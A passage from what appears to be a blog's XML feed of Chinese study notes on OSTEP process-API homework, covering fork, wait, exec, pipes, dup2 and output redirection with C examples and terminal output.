class="built_in">printf</span>(<span class="string">&quot;grxer&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent : hello&quot;</span>);</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; world\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; make 7</span><br><span class="line">gcc -g -Wall 7.c -o 7</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./7</span><br><span class="line">parent : hello world</span><br></pre></td></tr></table></figure><blockquote><p>没有输出的同时可以看出子进程继承了文件描述符，但是继承过后就是私有的了，不会影响父进程</p></blockquote><ol start="8"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pid_t</span> pid[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> pidfd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> res = pipe(pidfd);</span><br><span class="line">    assert(<span class="number">0</span> == res);</span><br><span class="line">    pid[<span class="number">0</span>] = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid[<span class="number">0</span>] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fork1 fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid[<span class="number">0</span>]) &#123;</span><br><span class="line">        close(pidfd[<span class="number">0</span>]);<span class="comment">//read</span></span><br><span class="line">        assert(dup2(pidfd[<span class="number">1</span>], STDOUT_FILENO) == STDOUT_FILENO);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;i am from pid[0]&quot;</span>);</span><br><span class="line">        close(pidfd[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        pid[<span class="number">1</span>] = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid[<span class="number">1</span>] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fork2 fail&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid[<span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="type">char</span> buf[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            close(pidfd[<span class="number">1</span>]);<span class="comment">//write</span></span><br><span class="line">            assert(dup2(pidfd[<span class="number">0</span>], STDIN_FILENO) == STDIN_FILENO);</span><br><span class="line">            read(STDIN_FILENO,buf,<span class="number">30</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;pid[1]:where are you from??\n %s&quot;</span>,buf);</span><br><span class="line">            close(pidfd[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            waitpid(pid[<span class="number">0</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">            waitpid(pid[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; make 8</span><br><span class="line">gcc -g -Wall 8.c -o 8</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./8</span><br><span class="line">pid[1]:where are you from??</span><br><span class="line"> i am from pid[0]⏎      </span><br></pre></td></tr></table></figure><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe</span><span class="params">(<span class="type">int</span> pipefd[<span class="number">2</span>])</span>;</span><br><span class="line">成功返回<span class="number">0</span> 失败返回<span class="number">-1</span></span><br></pre></td></tr></table></figure><p>管道：半双工通道，只允许数据在一个方向上传输的通道。发送方和接收方不能同时发送数据，只能轮流进行发送和接收。用于进程间通信</p><p>pipe函数创建一个管道，pipefd返回管道两端的文件描述符，pipefd[0]是读端，pipefd[1]是写端</p><p>管道可以理解为进程共用的内核空间里的一块内存来充当虚拟文件</p><p><img src="/2023/04/12/OSTEP-homework-5-Process-API/webp.webp" alt="img"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dup</span><span class="params">(<span class="type">int</span> oldfd)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dup2</span><span class="params">(<span class="type">int</span> oldfd, <span class="type">int</span> newfd)</span>;</span><br><span class="line">On success, these system calls <span class="keyword">return</span> the new descriptor.  On error, <span class="number">-1</span></span><br><span class="line">is returned, and errno is <span class="built_in">set</span> appropriately.</span><br></pre></td></tr></table></figure><p>dup函数创建一个oldfd文件描述符的副本(而且是动态的副本，本质上是一个，只不过起了不同名字)，不过不共享文件描述符标志，返回新文件描述符是取系统当前可用的最小整数值</p><p>dup2 和dup功能一样，不过它可以用newfd指定返回的新文件描述符号，如果newfd是一个已经打开的描述符，会把他先关闭</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:5 Process API</title>
      <link href="/2023/04/11/OSTEP-5-Process-API/"/>
      <url>/2023/04/11/OSTEP-5-Process-API/</url>
      
        <content type="html"><![CDATA[<h2 id="A-Little-Bit-Process-API"><a href="#A-Little-Bit-Process-API" class="headerlink" title="A Little Bit Process API"></a>A Little Bit Process API</h2><h3 id="fork"><a href="#fork" class="headerlink" title="fork()"></a>fork()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world (pid:%d)\n&quot;</span>, (<span class="type">int</span>)getpid());</span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// fork failed; exit</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// child (new process)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am child (pid:%d) by (ppid:%d)---%p\n&quot;</span>, (<span class="type">int</span>) getpid(),(<span class="type">int</span>)getppid(),&amp;x);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// parent goes down this path (original process)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am parent of %d (pid:%d)---%p\n&quot;</span>,</span><br><span class="line">           rc, (<span class="type">int</span>) getpid(),&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ./p1</span><br><span class="line">hello <span class="title function_">world</span> <span class="params">(pid:<span class="number">5116</span>)</span></span><br><span class="line">hello, I am parent of 5117 <span class="params">(pid:<span class="number">5116</span>)</span>---0x7ffd842ab520</span><br><span class="line">hello, I am <span class="title function_">child</span> <span class="params">(pid:<span class="number">5117</span>)</span> <span class="title function_">by</span> <span class="params">(ppid:<span class="number">1</span>)</span>---0x7ffd842ab520</span><br><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ./p1</span><br><span class="line">hello <span class="title function_">world</span> <span class="params">(pid:<span class="number">5164</span>)</span></span><br><span class="line">hello, I am parent of 5165 <span class="params">(pid:<span class="number">5164</span>)</span>---0x7ffd2fc1d450</span><br><span class="line">hello, I am <span class="title function_">child</span> <span class="params">(pid:<span class="number">5165</span>)</span> <span class="title function_">by</span> <span class="params">(ppid:<span class="number">5164</span>)</span>---0x7ffd2fc1d450</span><br></pre></td></tr></table></figure><p>man 2 fork</p><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><p>调用fork()的进程被称为父进程，fork()会创建一个子进程，子进程不会从 main()函数开始执行，而是直接从 fork()系统调用返回</p><p>子进程得到与父进程用户级虚拟地址空间相同的（但是独立的）一份副本，包括代码和数据段、堆、共享库以及用户栈。子进程还获得与父进程任何打开文件描述符相同的副本，这就意味着当父进程调用fork时，子进程可以读写父进程中打开的任何文件。父进程和新创建的子进程之间最大的区别在于它们有不同的PID。</p><p>fork的实质就是得到父进程在内核里描述进程信息的数据结构的副本，然后给一个新的pid</p><p>fork的子进程和父进程采用了一种叫做写时复制(copy-on-write )的技术，子进程直接复制了页表，他们刚开始映射到了同一块物理内存，刚开始物理地址和虚拟地址父子都相同，任何一个进程要对共享的页面“写操作”，内核会复制一个物理页面给这个进程使用，同时修改页表映射，copy on write同样存在于进程之间共享内存的场景</p><p>对于实际实现上可能会把原来可写页面标记为只读，并把页面引用计数加一，当有进程写入时会触发异常，操作系统根据引用计数来确定是COW，复制一份写入，并把页面引用计数减一</p><img src="/2023/04/11/OSTEP-5-Process-API/image-20230411222658013.png" alt="image-20230411222658013" style="zoom:67%;"><p>RETURN VALUE<br>On success, the PID of the child process is returned in the parent, and<br>0  is returned in the child.  On failure, -1 is returned in the parent,<br>no child process is created, and errno is set appropriately.</p><p>通过返回值可以进行不同处理</p><p>有趣的时我们上面两次结果的ppid是不同的，这是因为CPU调度程序（scheduler）决定了某个时刻哪个进程被执行，例如上一章的IO</p><p><img src="/2023/04/11/OSTEP-5-Process-API/image-20230411223805891.png" alt="image-20230411223805891"></p><p>进程1（init进程）没有父进程,是所有进程的祖先进程,如果子进程的父进程在子进程结束之前终止了，那么子进程的父进程ID就会变为1，即init进程的PID。</p></blockquote><h3 id="wait"><a href="#wait" class="headerlink" title="wait"></a>wait</h3><p>man 2 wait</p><p>进程结束后,内核并不是立即把它从系统中清除,被保持在一种已终止的状态中，直到被它的父进程回收(reaped)。被叫做僵死进程，如果父进程先结束了，虽然init进程会继承他们并回收，我们最好还是让父进程去做</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">waitpid</span><span class="params">(<span class="type">pid_t</span> pid,<span class="type">int</span> *stateusp,<span class="type">int</span> options=<span class="number">0</span>)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如果在调用waitpid()函数时，当指定等待的子进程已经停止运行或结束了，则waitpid()会立即返回；但是如果子进程还没有停止运行或结束，则调用waitpid()函数的父进程则会被阻塞，暂停运行。</span></span><br><span class="line"><span class="comment">返回：如果成功，则为子进程的 PID, 如果 option WNOHANG, 则为 0, 如果其他错误，则为— 1,</span></span><br><span class="line"><span class="comment">arg1    pid&gt;0 等待集合是一个单独的子进程 id=pid</span></span><br><span class="line"><span class="comment">        pid =0 等待进程组号与目前进程相同的任何进程</span></span><br><span class="line"><span class="comment">        pid=-1 等待集合就是由父进程所有的子进程组成的</span></span><br><span class="line"><span class="comment">        pid&lt; -1等待进程组号为pid绝对值的任何子进程</span></span><br><span class="line"><span class="comment">arg2    放上关于导致返回的子进程的状态信息，wait.h头文件定义了返回宏</span></span><br><span class="line"><span class="comment">arg3    • WNOHANG: 非阻塞等待进程，如果等待集合中的任何子进程都还没有终止，那么就立即返回（返回值为 0)。如果有子进程退出了，父进程调用waitpid函数返回子进程的PID，在等待子进程终止的同时，如果还想做些有用的丁作，这个选项会有用。</span></span><br><span class="line"><span class="comment">        • WUNTRACED: 挂起调用进程的执行，直到等待集合中的一个进程变成巳终止或者被停止。返回的 PID 为导致返回的巳终止或被停止子进程的 PID 。 默认的行为是只返回己终止的子进程。当你想要检查己终止和被停止的子进程时，这个选项会有用。</span></span><br><span class="line"><span class="comment">        • WCONTINUED: 挂起调用进程的执行，直到等待集合中一个正在运行的进程终止或等待集合中一个被停止的进程收到 SIGCONT 信号重新开始执行。 </span></span><br><span class="line"><span class="comment">*/</span>    </span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">wait</span><span class="params">(<span class="type">int</span> *statusp)</span>;</span><br><span class="line">waitpid的简单版本 相当于waitpid(- <span class="number">1</span>,*statusp, <span class="number">0</span>)</span><br><span class="line">返回：如果成功，则为子进程的 PID, 如果出错，则为 <span class="number">-1</span> 。</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world (pid:%d)\n&quot;</span>, (<span class="type">int</span>) getpid());</span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// fork failed; exit</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// child (new process)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am child (pid:%d)\n&quot;</span>, (<span class="type">int</span>) getpid());</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// parent goes down this path (original process)</span></span><br><span class="line">        <span class="type">int</span> wc = wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello, I am parent of %d (wc:%d) (pid:%d)\n&quot;</span>,</span><br><span class="line">           rc, wc, (<span class="type">int</span>) getpid());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ./p2</span><br><span class="line">hello world (pid:5404)</span><br><span class="line">hello, I am child (pid:5405)</span><br><span class="line">hello, I am parent of 5405 (wc:5405) (pid:5404)</span><br></pre></td></tr></table></figure><p>两个进程运行先后顺序还是取决于cpu调度</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p>man 3 exec</p><p>exec 函数族</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">execl</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">const</span> <span class="type">char</span> *arg, ...</span></span><br><span class="line"><span class="params">          <span class="comment">/* (char  *) NULL */</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execlp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">const</span> <span class="type">char</span> *arg, ...</span></span><br><span class="line"><span class="params">           <span class="comment">/* (char  *) NULL */</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execle</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">const</span> <span class="type">char</span> *arg, ...</span></span><br><span class="line"><span class="params">           <span class="comment">/*, (char *) NULL, char *const envp[] */</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execv</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv[])</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[])</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execvp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">char</span> *<span class="type">const</span> argv[])</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">execvpe</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">char</span> *<span class="type">const</span> argv[],</span></span><br><span class="line"><span class="params">            <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br></pre></td></tr></table></figure><p>只有execve是真正意义上的系统调用，其它都是在此基础上经过包装的库函数，函数功能大同小异就是调用加载器根据要加载的ELF头表里的信息覆写调用程序<br>的代码段（以及静态数据），堆、栈及其他内存空间也会被重新初始化，并把参数传递，该函数调用成功不会返回</p><p>execve实际上也不会把磁盘里的程序拷贝到物理内存，而是把进程的页表映射到磁盘上，触发缺页后由处理程序再加载到物理内存供cpu 使用</p><p>被继承</p><ul><li>文件描述符</li><li>信号处理程序</li><li>用户和组 ID</li><li>环境变量</li><li>信号屏蔽字</li></ul><p>当前进程中的任何线程或锁不会被继承，在新程序中，不会有任何父进程中的局部变量、栈和堆等内存信息。</p><p><code>int execve(const char *pathname, char *const argv[], char *const envp[])</code></p><ul><li>filename：指向可执行文件名的用户空间指针。</li><li>argv：参数列表，指向用户空间的参数列表起始地址 </li><li>envp：环境变量表，环境变量是一系列键值对，字符串类型</li><li>argv envp数组以null结尾</li></ul><p><code>int main (int argc, char *argv [], char *envp [])</code></p><p><img src="/2023/04/11/OSTEP-5-Process-API/image-20230420112311806.png" alt="image-20230420112311806"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* myecho.c */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[],<span class="type">char</span> *envp[])</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; argc; j++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;argv[%d]: %s\n&quot;</span>, j, argv[j]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; envp[i]; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, envp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* execve.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">    <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *newargv[] = &#123; <span class="literal">NULL</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="type">char</span> *newenviron[] = &#123; <span class="string">&quot;grxer=666&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s &lt;file-to-exec&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    newargv[<span class="number">0</span>] = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    execve(argv[<span class="number">1</span>], newargv, newenviron);</span><br><span class="line">    perror(<span class="string">&quot;execve&quot;</span>);   <span class="comment">/* execve() returns only on error */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/test&gt; gcc  -g -o myecho myecho.c &amp;&amp; gcc -g -o execve execve.c</span><br><span class="line">grxer@grxer ~/D/s/test&gt; ./execve ./myecho</span><br><span class="line">argv[0]: ./myecho</span><br><span class="line">argv[1]: hello</span><br><span class="line">argv[2]: world</span><br><span class="line">grxer=666</span><br><span class="line">./myecho</span><br><span class="line">hello</span><br><span class="line">world</span><br></pre></td></tr></table></figure><h3 id="用奇怪的约定做一些神奇的事情"><a href="#用奇怪的约定做一些神奇的事情" class="headerlink" title="用奇怪的约定做一些神奇的事情"></a>用奇怪的约定做一些神奇的事情</h3><p>fork和exev看起来是非常奇怪的，为什么要把两个操作分开去创建新进程，而不是整合成一个api，其实这给了shell 在fork 之后 exec 之前运行代码的机会，来实现一些很有趣的事</p><p>比如说我们的输出重定向</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// fork failed; exit</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// child: redirect standard output to a file</span></span><br><span class="line">    close(STDOUT_FILENO); </span><br><span class="line">    open(<span class="string">&quot;./p4.output&quot;</span>, O_CREAT|O_WRONLY|O_TRUNC, S_IRWXU);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// now exec &quot;wc&quot;...</span></span><br><span class="line">        <span class="type">char</span> *myargs[<span class="number">3</span>];</span><br><span class="line">        myargs[<span class="number">0</span>] = strdup(<span class="string">&quot;wc&quot;</span>);   <span class="comment">// program: &quot;wc&quot; (word count)</span></span><br><span class="line">        myargs[<span class="number">1</span>] = strdup(<span class="string">&quot;p4.c&quot;</span>); <span class="comment">// argument: file to count</span></span><br><span class="line">        myargs[<span class="number">2</span>] = <span class="literal">NULL</span>;           <span class="comment">// marks end of array</span></span><br><span class="line">        execvp(myargs[<span class="number">0</span>], myargs);  <span class="comment">// runs word count</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// parent goes down this path (original process)</span></span><br><span class="line">        <span class="type">int</span> wc = wait(<span class="literal">NULL</span>);</span><br><span class="line">    assert(wc &gt;= <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ./p4</span><br><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; cat ./p4.output </span><br><span class="line"> <span class="number">34</span> <span class="number">114</span> <span class="number">918</span> p4.c</span><br></pre></td></tr></table></figure><p>可以看到我们成功把输出重定向到文件</p><p>原理：</p><p>fork后子进程会继承父进程默认打开的标准输入、标准输出和标准错误输出0、1 和 2 ，默认情况下，这些文件描述符与终端设备关联，因此，当程序从标准输入读取数据时，数据会从终端输入；当程序向标准输出写入数据时，数据会输出到终端。</p><p>我们在exec前把标准输出文件描述符给关闭，然后再打开.&#x2F;p4.output时，UNIX 系统从 0 开始寻找可以使用的文件描述符，自然找到之前被关闭的标准输出文件描述符，给替换掉，实现重定向</p><p>strace看一下 -ff filename 将不同进程(子进程)产生的系统调用输出到filename.PID文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; strace -ff -o task ./p4</span><br><span class="line">grxer@grxer ~/D/s/O/o/cpu-api&gt; ls ./task*</span><br><span class="line">./task.7615  ./task.7616</span><br><span class="line"></span><br><span class="line">close(1)                                = 0</span><br><span class="line">openat(AT_FDCWD, &quot;./p4.output&quot;, O_WRONLY|O_CREAT|O_TRUNC, 0700) = 1</span><br><span class="line">newfstatat(1, &quot;&quot;, &#123;st_mode=S_IFREG|0777, st_size=17, ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">write(1, &quot; 34 114 918 p4.c\n&quot;, 17)      = 17</span><br></pre></td></tr></table></figure><p>The openat() system call operates in exactly the same way as open(2)</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2016 Hitcon House Of Orange</title>
      <link href="/2023/04/10/2016-hitcon-house-of-orange/"/>
      <url>/2023/04/10/2016-hitcon-house-of-orange/</url>
      
